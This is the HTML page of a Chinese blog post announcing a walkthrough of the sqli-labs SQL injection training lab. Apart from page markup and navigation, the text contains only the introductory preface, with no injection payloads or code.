

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/chongqing.jpg">
  <link rel="icon" href="/img/chongqing.jpg">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="sangnigege">
  <meta name="keywords" content="一个做事不将就的人，阻止他的只有时间">
  
    <meta name="description" content="前言 本文是作者由CSDN博客迁移而来，原文地址：https:&#x2F;&#x2F;blog.csdn.net&#x2F;2302_81178149&#x2F;article&#x2F;details&#x2F;142738784?spm&#x3D;1001.2014.3001.5501  我们下面进行大部分Web手接触的第一个漏洞——SQL注入的学习，SQL注入是owasp top10之一，是Web安全常见漏洞。为探讨清楚SQL注入的诸多细节，我们特选经典的sq">
<meta property="og:type" content="article">
<meta property="og:title" content="sqli-labs通关全详解">
<meta property="og:url" content="http://example.com/2025/05/04/sqli-labs%E9%80%9A%E5%85%B3%E5%85%A8%E8%AF%A6%E8%A7%A3/index.html">
<meta property="og:site_name" content="重庆森林不在重庆">
<meta property="og:description" content="前言 本文是作者由CSDN博客迁移而来，原文地址：https:&#x2F;&#x2F;blog.csdn.net&#x2F;2302_81178149&#x2F;article&#x2F;details&#x2F;142738784?spm&#x3D;1001.2014.3001.5501  我们下面进行大部分Web手接触的第一个漏洞——SQL注入的学习，SQL注入是owasp top10之一，是Web安全常见漏洞。为探讨清楚SQL注入的诸多细节，我们特选经典的sq">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021935977.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021935159.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021935026.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021935816.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021935896.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021935014.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021935774.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021935899.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021935252.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936505.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936873.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936335.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936395.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936830.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936664.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936644.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936564.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936139.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936518.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936203.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936469.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936892.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936142.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936666.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936593.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937329.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937822.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937251.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937082.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937760.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937918.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937000.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937481.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937488.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937381.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937924.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937122.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937113.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937821.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937089.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937456.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937514.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938851.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938025.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938608.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938537.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938687.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938998.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938762.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938852.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938642.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938940.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938386.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938238.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938342.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938222.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938574.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938415.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939743.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939245.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939320.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939564.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939805.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939784.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939040.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939258.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939835.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939950.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939166.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939894.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939385.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939543.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939272.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021940021.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939557.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021940775.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021940347.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021940200.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021940503.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021940255.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021940251.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021940742.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021940578.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941087.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941748.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941674.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941004.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941397.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941568.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941559.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941495.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941772.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941633.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941211.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941791.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941172.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941449.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941830.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941909.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941634.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942302.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942838.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942234.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942295.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942837.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942226.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942407.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942494.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942602.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942542.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942897.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021947200.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942080.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942990.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943317.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943954.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943181.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943285.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943337.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943147.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943119.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943358.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943413.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943699.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943580.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943824.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943405.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943318.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943253.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943975.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943950.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943666.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943637.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943338.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943919.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944798.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944507.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944466.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944702.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944529.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944213.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944504.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944893.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944135.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944962.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944603.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944680.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944590.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944283.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944269.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944784.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944578.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944357.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945729.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945746.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945569.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945923.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945924.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945196.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945154.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945050.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945784.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945402.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021947162.png">
<meta property="og:image" content="https://i-blog.csdnimg.cn/direct/a9a6d61b93fc4d219c280213ead713e2.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945153.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945202.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945302.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945350.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945918.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945831.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945539.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946107.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946886.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946711.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946994.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946479.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946844.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946307.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946779.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946633.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946015.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946604.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946502.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946713.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946822.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946010.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946418.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946266.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021947177.png">
<meta property="article:published_time" content="2025-05-04T09:07:00.000Z">
<meta property="article:modified_time" content="2025-05-04T09:19:23.390Z">
<meta property="article:author" content="sangnigege">
<meta property="article:tag" content="一个做事不将就的人，阻止他的只有时间">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021935977.png">
  
  
  
  <title>sqli-labs通关全详解 - 重庆森林不在重庆</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"TKccC2BvrQ0jKroA5aUdv8tr-gzGzoHsz","app_key":"rSHs3EnI9lT7nQwv5J7fcBnq","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>重庆森林不在重庆</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="sqli-labs通关全详解"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-05-04 17:07" pubdate>
          2025年5月4日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          9.1k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          76 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">sqli-labs通关全详解</h1>
            
            
              <div class="markdown-body">
                
                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
<p>本文是作者由CSDN博客迁移而来，原文地址：<a target="_blank" rel="noopener" href="https://blog.csdn.net/2302_81178149/article/details/142738784?spm=1001.2014.3001.5501">https://blog.csdn.net/2302_81178149/article/details/142738784?spm=1001.2014.3001.5501</a></p>
</blockquote>
<p>我们下面进行大部分Web手接触的第一个漏洞——SQL注入的学习，SQL注入是owasp top10之一，是Web安全常见漏洞。为探讨清楚SQL注入的诸多细节，<strong>我们特选经典的sqli-labs进行从入门到进阶的强化训练</strong>。</p>
<p>在做题过程中，作者把用到的知识进行了全面、详细、系统的总结，所以为了方便学习，查阅适配此文的总结是必不可少的**（怎么可以光训练不去学习、总结呢）**。</p>
